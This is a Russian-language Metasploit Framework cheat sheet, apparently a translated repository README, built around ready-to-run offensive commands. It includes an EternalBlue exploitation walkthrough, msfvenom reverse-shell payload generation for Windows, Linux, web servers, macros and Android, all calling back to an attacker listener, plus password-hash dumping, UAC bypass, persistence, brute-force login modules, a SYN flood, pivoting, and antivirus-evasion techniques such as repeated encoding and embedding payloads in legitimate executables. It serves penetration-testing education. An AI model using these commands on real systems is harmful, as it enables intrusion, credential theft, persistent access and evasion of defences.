<a id="-metasploit-framework---complete-cheatsheet"></a>
# 🔴 Metasploit Framework — полная шпаргалка

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)


[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![Лицензия](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Один из самых распространённых фреймворков тестирования на проникновение** — подробное руководство по освоению Metasploit

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Введение](#-introduction)
- [Установка](#-installation)
- [Обзор архитектуры](#-architecture-overview)
- [Запуск Metasploit](#-starting-metasploit)
- [Основные команды](#-basic-commands)
- [Типы модулей](#-module-types)
- [Порядок эксплуатации](#-exploitation-workflow)
- [Интеграция с базой данных](#-database-integration)
- [Сканирование и сбор сведений](#-scanning--enumeration)
- [Создание полезной нагрузки (msfvenom)](#-payload-generation-msfvenom)
- [Действия после получения доступа](#-post-exploitation)
- [Вспомогательные модули](#-auxiliary-modules)
- [Практические примеры](#-real-world-examples)
- [Справочные таблицы](#-quick-reference-tables)
- [Советы и рекомендуемые практики](#-tips--best-practices)
- [Полезные материалы](#-resources)

---

<a id="-introduction"></a>
## 🎯 Введение

**Metasploit Framework** — открытая платформа для тестирования на проникновение и разработки эксплойтов. Она предоставляет:

- 🔍 **Сбор сведений** и поиск уязвимостей
- 💉 **Разработку эксплойтов** и их доставку
- 🎭 **Создание полезных нагрузок** для разных платформ
- 🔐 **Инструменты и методы работы после получения доступа**
- 📊 **Средства подготовки отчётов** и документирования

<a id="key-components"></a>
### Основные компоненты

| Компонент | Описание |
|-----------|-------------|
| `msfconsole` | Основной интерфейс командной строки |
| `msfvenom` | Генератор и кодировщик полезной нагрузки |
| `msfdb` | Утилита управления базой данных |
| `msfrpcd` | Демон RPC для удалённого доступа |

---

<a id="-installation"></a>
## 📥 Установка

<a id="kali-linux-pre-installed"></a>
### Kali Linux (предустановлен)
```bash
# Обновить Metasploit
sudo apt update && sudo apt install metasploit-framework
```

<a id="ubuntudebian"></a>
### Ubuntu/Debian

> **Версии и установка:** команды сохранены как в оригинале. Способ установки, зависимости и поддержка платформ меняются; сверяйте их с [официальной инструкцией Rapid7](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html). Название Windows-раздела передаёт оценку автора оригинала, а не отсутствие поддержки Windows.
```bash
# Установить зависимости
sudo apt install curl gnupg2 software-properties-common

# Добавить репозиторий Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

<a id="docker"></a>
### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

<a id="windows-not-recommended-for-production"></a>
### Windows (в оригинале не рекомендуется для рабочих сред)
```powershell
# Скачать установщик: https://windows.metasploit.com/
# Запустить установщик и следовать инструкциям
```

---

<a id="-architecture-overview"></a>
## 🏗️ Обзор архитектуры

> На схеме Exploits — модули эксплуатации; Payloads — полезные нагрузки; Auxiliary — вспомогательные модули; Post — действия после получения доступа; Encoders — кодировщики; NOPs — генераторы NOP; Evasion — обход обнаружения; Plugins — плагины; Interfaces — интерфейсы; Database — база данных. Число модулей приблизительно и отражает оригинал.

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                      INTERFACES                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 DATABASE (PostgreSQL)                        │
└─────────────────────────────────────────────────────────────┘
```

<a id="directory-structure"></a>
### Структура каталогов
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Модули эксплуатации
│   ├── payloads/      # Модули полезной нагрузки
│   ├── auxiliary/     # Сканирование, фаззинг и т. п.
│   ├── post/          # Действия после получения доступа
│   ├── encoders/      # Кодировщики полезной нагрузки
│   ├── nops/          # Генераторы NOP
│   └── evasion/       # Модули обхода антивируса
├── tools/             # Дополнительные инструменты
├── scripts/           # Скрипты Meterpreter
├── data/              # Словари и шаблоны
└── plugins/           # Плагины консоли
```

---

<a id="-starting-metasploit"></a>
## 🚀 Запуск Metasploit

<a id="initialize-database-first-time"></a>
### Инициализация базы данных при первом запуске
```bash
# Запустить службу PostgreSQL
sudo systemctl start postgresql

# Инициализировать базу данных
sudo msfdb init

# Проверить состояние базы данных
sudo msfdb status
```

<a id="launch-msfconsole"></a>
### Запуск msfconsole
```bash
# Обычный запуск
msfconsole

# Тихий запуск без баннера
msfconsole -q

# Выполнить команды при запуске
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Загрузить ресурсный файл
msfconsole -r commands.rc
```

---

<a id="-basic-commands"></a>
## ⌨️ Основные команды

<a id="navigation--help"></a>
### Навигация и справка

| Команда | Описание |
|---------|-------------|
| `help` или `?` | Показать справку |
| `help <command>` | Справка по определённой команде |
| `search <term>` | Поиск модулей по имени, CVE или платформе |
| `use <module>` | Выбрать модуль |
| `back` | Выйти из текущего модуля |
| `info` | Показать сведения о модуле |
| `show options` | Показать параметры модуля |
| `show advanced` | Показать дополнительные параметры |
| `show payloads` | Перечислить совместимые полезные нагрузки |
| `show targets` | Показать доступные цели |

<a id="module-configuration"></a>
### Настройка модуля

```bash
# Задать параметры
set RHOSTS 192.168.1.100          # IP-адрес цели
set RPORT 445                      # Порт цели
set LHOST 192.168.1.50            # Локальный IP-адрес атакующего
set LPORT 4444                     # Локальный порт обработчика подключений
set PAYLOAD windows/meterpreter/reverse_tcp

# Задать глобально (сохраняется при переключении модулей)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Сбросить параметры
unset RHOSTS
unsetg LHOST

# Проверить текущие настройки
show options
check                              # Проверить наличие уязвимости у цели
```

<a id="execution"></a>
### Выполнение

```bash
# Запустить эксплойт
exploit
run

# Запустить в фоновом режиме
exploit -j

# Запустить с определёнными параметрами
exploit -z                         # После успеха не переходить к управлению сеансом
```

<a id="session-management"></a>
### Управление сеансами

```bash
# Перечислить сеансы
sessions
sessions -l

# Перейти к управлению сеансом
sessions -i 1

# Завершить сеанс
sessions -k 1

# Завершить все сеансы
sessions -K

# Преобразовать командную оболочку в сеанс Meterpreter
sessions -u 1

# Выполнить команду во всех сеансах
sessions -c "sysinfo"
```

---

<a id="-module-types"></a>
## 📦 Типы модулей

<a id="1-exploits"></a>
### 1. Exploits — модули эксплуатации
Модули, использующие уязвимости.

```bash
# Найти эксплойты
search type:exploit platform:windows

# Пример
use exploit/windows/smb/ms17_010_eternalblue
```

<a id="2-payloads"></a>
### 2. Payloads — полезные нагрузки
Код, выполняемый после успешной эксплуатации.

**Типы:**
- **Singles** — самодостаточные полезные нагрузки
- **Stagers** — небольшие загрузчики, устанавливающие соединение между атакующим и целью
- **Stages** — основные компоненты, загружаемые через stager (например, Meterpreter)

```bash
# Перечислить полезные нагрузки
show payloads

# Схема имён полезных нагрузок
<platform>/<arch>/<type>/<connection>
# Пример: windows/x64/meterpreter/reverse_tcp
```

<a id="3-auxiliary"></a>
### 3. Auxiliary — вспомогательные модули
Сканирование, фаззинг, перехват трафика и другие вспомогательные действия.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

<a id="4-post"></a>
### 4. Post — действия после получения доступа
Модули для действий после получения доступа.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

<a id="5-encoders"></a>
### 5. Encoders — кодировщики

> **Уточнение:** кодировщики прежде всего решают проблему недопустимых байтов. Кодирование, в том числе многократное, не гарантирует обход антивируса; см. [разъяснение Rapid7](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/). Примеры и рекомендация оригинала сохранены.
Кодируют полезные нагрузки; в оригинале это описано как способ обхода обнаружения.

```bash
show encoders
# Пример: x86/shikata_ga_nai
```

---

<a id="-exploitation-workflow"></a>
## 🎯 Порядок эксплуатации

> Этапы схемы: разведка и сбор сведений → выбор модуля → настройка параметров → проверка цели → эксплуатация → действия после получения доступа. Команда check поддерживается не каждым модулем и не заменяет оценку применимости эксплойта.

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   RECON &    │───▶│    SELECT    │───▶│  CONFIGURE   │
│  ENUMERATION │    │    MODULE    │    │   OPTIONS    │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    POST-     │◀───│   EXPLOIT    │◀───│    CHECK     │
│ EXPLOITATION │    │    TARGET    │    │    TARGET    │
└──────────────┘    └──────────────┘    └──────────────┘
```

<a id="step-by-step-example"></a>
### Пошаговый пример

```bash
# 1. Найти эксплойт
msf6 > search eternalblue

# 2. Выбрать модуль
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Посмотреть параметры
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Указать цель
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Указать полезную нагрузку
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Настроить обработчик подключений
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Проверить уязвимость (необязательно)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Выполнить
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-database-integration"></a>
## 🗄️ Интеграция с базой данных

<a id="setup--connection"></a>
### Настройка и подключение

```bash
# Инициализировать базу данных
msfdb init

# Подключиться к базе данных
db_connect msf:password@127.0.0.1/msf

# Проверить состояние
db_status

# Отключиться
db_disconnect
```

<a id="workspace-management"></a>
### Управление рабочими пространствами

```bash
# Перечислить рабочие пространства
workspace

# Создать рабочее пространство
workspace -a pentest_project

# Переключить рабочее пространство
workspace pentest_project

# Удалить рабочее пространство
workspace -d old_project

# Переименовать рабочее пространство
workspace -r old_name new_name
```

<a id="host-management"></a>
### Управление узлами

```bash
# Перечислить узлы
hosts

# Добавить узел вручную
hosts -a 192.168.1.100

# Удалить узел
hosts -d 192.168.1.100

# Поиск узлов
hosts -S windows

# Экспортировать узлы
hosts -o /tmp/hosts.csv
```

<a id="service-management"></a>
### Управление сервисами

```bash
# Перечислить сервисы
services

# Отфильтровать по порту
services -p 80,443

# Отфильтровать по имени сервиса
services -s http

# Поиск сервисов
services -S microsoft
```

<a id="vulnerability-management"></a>
### Управление сведениями об уязвимостях

```bash
# Перечислить уязвимости
vulns

# Добавить уязвимость
vulns -a 192.168.1.100 -n "MS17-010"
```

<a id="importexport"></a>
### Импорт и экспорт

```bash
# Импортировать результаты Nmap
db_import /path/to/nmap_scan.xml

# Импортировать результаты Nessus
db_import /path/to/nessus_scan.nessus

# Запустить Nmap непосредственно из консоли
db_nmap -sV -O 192.168.1.0/24

# Экспортировать данные
hosts -o hosts.csv
services -o services.csv
```

---

<a id="-scanning--enumeration"></a>
## 🔍 Сканирование и сбор сведений

<a id="port-scanning"></a>
### Сканирование портов

```bash
# Сканирование TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Сканирование с полным TCP-соединением
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

<a id="service-enumeration"></a>
### Сбор сведений о сервисах

```bash
# Сбор сведений об SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Общие ресурсы SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# Версия SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Версия HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Сбор сведений об FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

<a id="vulnerability-scanning"></a>
### Поиск уязвимостей

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Сканер уязвимости HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

<a id="-payload-generation-msfvenom"></a>
## 💉 Создание полезной нагрузки (msfvenom)

<a id="basic-syntax"></a>
### Основной синтаксис
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

<a id="common-options"></a>
### Основные параметры

| Параметр | Описание |
|--------|-------------|
| `-p` | Используемая полезная нагрузка |
| `-f` | Формат вывода |
| `-o` | Выходной файл |
| `-e` | Используемый кодировщик |
| `-i` | Число проходов кодирования |
| `-b` | Недопустимые байты, которых нужно избегать |
| `-n` | Размер последовательности NOP |
| `--platform` | Целевая платформа |
| `-a` | Архитектура |
| `LHOST` | IP-адрес обработчика подключений |
| `LPORT` | Порт обработчика подключений |

<a id="windows-payloads"></a>
### Полезные нагрузки для Windows

```bash
# Обратное TCP-соединение (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Обратное TCP-соединение (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Обратное HTTPS-соединение с шифрованием
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Входящее TCP-соединение (bind)
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# С кодированием (в оригинале — для обхода антивируса)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

<a id="linux-payloads"></a>
### Полезные нагрузки для Linux

```bash
# Обратное TCP-соединение
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Обратное TCP-соединение (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Командная оболочка с входящим соединением (bind shell)
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

<a id="web-payloads"></a>
### Полезные нагрузки для веб-приложений

```bash
# Обратная командная оболочка PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Обратная командная оболочка ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Обратная командная оболочка ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Обратная командная оболочка JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# Файл WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

<a id="scripting-payloads"></a>
### Полезные нагрузки для скриптовых языков

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (макрос)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

<a id="android-payloads"></a>
### Полезные нагрузки для Android

```bash
# Обратное TCP-соединение для Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

<a id="macos-payloads"></a>
### Полезные нагрузки для macOS

```bash
# Обратное TCP-соединение для macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

<a id="multihandler-setup"></a>
### Настройка Multi/Handler

```bash
# Запустить обработчик подключений
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

<a id="-post-exploitation"></a>
## 🔓 Действия после получения доступа

<a id="basic-post-modules"></a>
### Основные модули Post

```bash
# Получить сведения о системе
use post/windows/gather/enum_system

# Получить вошедших пользователей
use post/windows/gather/enum_logged_on_users

# Выгрузить хеши паролей
use post/windows/gather/hashdump

# Учётные данные из памяти
use post/windows/gather/credentials/credential_collector

# Проверить наличие виртуальной машины
use post/windows/gather/checkvm
```

<a id="privilege-escalation"></a>
### Повышение привилегий

```bash
# Подбор способов повышения привилегий Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Обход UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Получить SYSTEM
use post/windows/escalate/getsystem
```

<a id="persistence"></a>
### Закрепление доступа

```bash
# Закрепление через реестр
use exploit/windows/local/persistence_service
set SESSION 1
run

# Закрепление через планировщик заданий
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

<a id="-auxiliary-modules"></a>
## 🔧 Вспомогательные модули

<a id="brute-force"></a>
### Перебор паролей

```bash
# Перебор паролей SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Перебор паролей SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Перебор паролей FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

<a id="sniffing"></a>
### Перехват трафика

```bash
# Перехватчик паролей HTTP
use auxiliary/sniffer/psnuffle
run

# Перехватить пакеты
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

<a id="dos-testing-only"></a>
### DoS (только для тестирования)

```bash
# SYN-флуд
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

<a id="-real-world-examples"></a>
## 🎬 Практические примеры

<a id="example-1-eternalblue-attack-ms17-010"></a>
### Пример 1: атака EternalBlue (MS17-010)

```bash
# Запустить Metasploit
msfconsole -q

# Найти эксплойт
search eternalblue

# Выбрать эксплойт
use exploit/windows/smb/ms17_010_eternalblue

# Настроить
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Проверить наличие уязвимости
check

# Выполнить эксплуатацию
exploit
```

<a id="example-2-web-application-attack"></a>
### Пример 2: атака на веб-приложение

```bash
# Проверить наличие уязвимостей
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Эксплуатировать загрузку файлов
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

<a id="example-3-multi-handler-with-msfvenom"></a>
### Пример 3: Multi-Handler с msfvenom

```bash
# Терминал 1: создать полезную нагрузку
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Терминал 2: запустить обработчик
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Передать payload.exe на цель и выполнить
# Сеанс подключится к обработчику
```

<a id="example-4-pivoting-through-compromised-host"></a>
### Пример 4: доступ к внутренней сети через скомпрометированный узел

```bash
# После получения сеанса Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# Или из msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Теперь проверить внутреннюю сеть
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

<a id="-quick-reference-tables"></a>
## 📊 Справочные таблицы

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
|---------|-------------|
| `search <term>` | Поиск модулей |
| `use <module>` | Выбрать модуль |
| `show options` | Показать параметры |
| `set <opt> <val>` | Задать значение параметра |
| `exploit` / `run` | Выполнить модуль |
| `back` | Вернуться к основному интерфейсу |
| `sessions -l` | Перечислить сеансы |
| `sessions -i <id>` | Перейти к управлению сеансом |

<a id="common-payloads"></a>
### Распространённые полезные нагрузки

| Полезная нагрузка | Описание |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Meterpreter для Windows (32 бита) |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter для Windows (64 бита) |
| `windows/meterpreter/reverse_https` | Зашифрованное соединение |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter для Linux |
| `php/meterpreter/reverse_tcp` | Meterpreter для PHP |
| `java/jsp_shell_reverse_tcp` | Командная оболочка Java/JSP |
| `android/meterpreter/reverse_tcp` | Meterpreter для Android |

<a id="output-formats-msfvenom"></a>
### Форматы вывода (msfvenom)

| Формат | Расширение | Применение |
|--------|-----------|----------|
| `exe` | .exe | Исполняемый файл Windows |
| `elf` | (none) — без расширения | Исполняемый файл Linux |
| `macho` | (none) — без расширения | Исполняемый файл macOS |
| `raw` | зависит от формата | Шелл-код в исходном бинарном виде |
| `asp` | .asp | Веб-сервер IIS |
| `aspx` | .aspx | Веб-сервер .NET |
| `php` | .php | Веб-сервер PHP |
| `jsp` | .jsp | Веб-сервер Java |
| `war` | .war | Развёртывание в Tomcat |
| `psh` | .ps1 | Скрипт PowerShell |
| `vba` | .vba | Макрос Office |
| `dll` | .dll | Библиотека Windows |

<a id="popular-encoders"></a>
### Популярные кодировщики

| Кодировщик | Описание |
|---------|-------------|
| `x86/shikata_ga_nai` | Полиморфный кодировщик XOR |
| `x64/xor` | Кодировщик XOR (64 бита) |
| `x86/alpha_mixed` | Буквенно-цифровой кодировщик |
| `php/base64` | Кодировщик Base64 для PHP |

---

<a id="-tips--best-practices"></a>
## 💡 Советы и рекомендуемые практики

<a id="-legal-disclaimer"></a>
### ⚠️ Правовое уведомление
> **ВАЖНО:** используйте Metasploit только для собственных систем или при наличии явного письменного разрешения на тестирование. Несанкционированный доступ к компьютерным системам незаконен.

<a id="performance-tips"></a>
### Советы по производительности

1. **Использовать базу данных**
   ```bash
   # Всегда инициализировать и использовать базу данных
   msfdb init
   db_status
   ```

2. **Использовать рабочие пространства**
   ```bash
   workspace -a client_pentest
   ```

3. **Ресурсные скрипты**
   ```bash
   # Сохранить команды в файл .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Выполнить скрипт
   msfconsole -r handler.rc
   ```

4. **Разумно задавать число потоков**
   ```bash
   set THREADS 10  # Не перегружать целевой узел
   ```

<a id="evasion-techniques"></a>
### Методы обхода обнаружения

1. **Несколько проходов кодирования**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Собственные шаблоны**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Использовать полезные нагрузки с HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

<a id="troubleshooting"></a>
### Устранение неполадок

| Проблема | Решение |
|-------|----------|
| Не удаётся подключиться к базе данных | `msfdb reinit` |
| Модуль не загружается | `reload_all` |
| Сеанс немедленно завершается | Проверить влияние антивируса; в оригинале предлагается кодирование нагрузки |
| Эксплуатация не удаётся | Проверить версию ОС цели и выбранный вариант target |

---

<a id="-resources"></a>
## 📚 Полезные материалы

<a id="official-documentation"></a>
### Официальная документация
- [Metasploit Docs](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)

<a id="learning-resources"></a>
### Учебные материалы
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

<a id="cheatsheets"></a>
### Шпаргалки
- [SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Meterpreter Cheatsheet](./Meterpreter.ru.md)

---

<a id="-license"></a>
## 📄 Лицензия

Эта шпаргалка предназначена только для обучения. Используйте материалы ответственно и этично.

---

<p align="center">
  <b>Успешной практики! 🔴</b><br>
  <i>Помните: большая сила предполагает большую ответственность</i>
</p>
